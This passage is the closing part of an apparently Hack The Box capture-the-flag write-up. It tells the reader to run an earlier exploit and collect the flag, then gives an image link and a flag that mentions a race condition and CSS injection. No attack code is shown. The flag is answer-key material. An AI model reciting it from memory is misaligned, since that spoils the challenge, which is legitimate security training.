    Run the exploit, then navigate to the root website of challenge to retrieve the flag
  
  
    ![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/d36769ee-6338-4fc2-b7b1-f43821379802)



## Flag
HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}
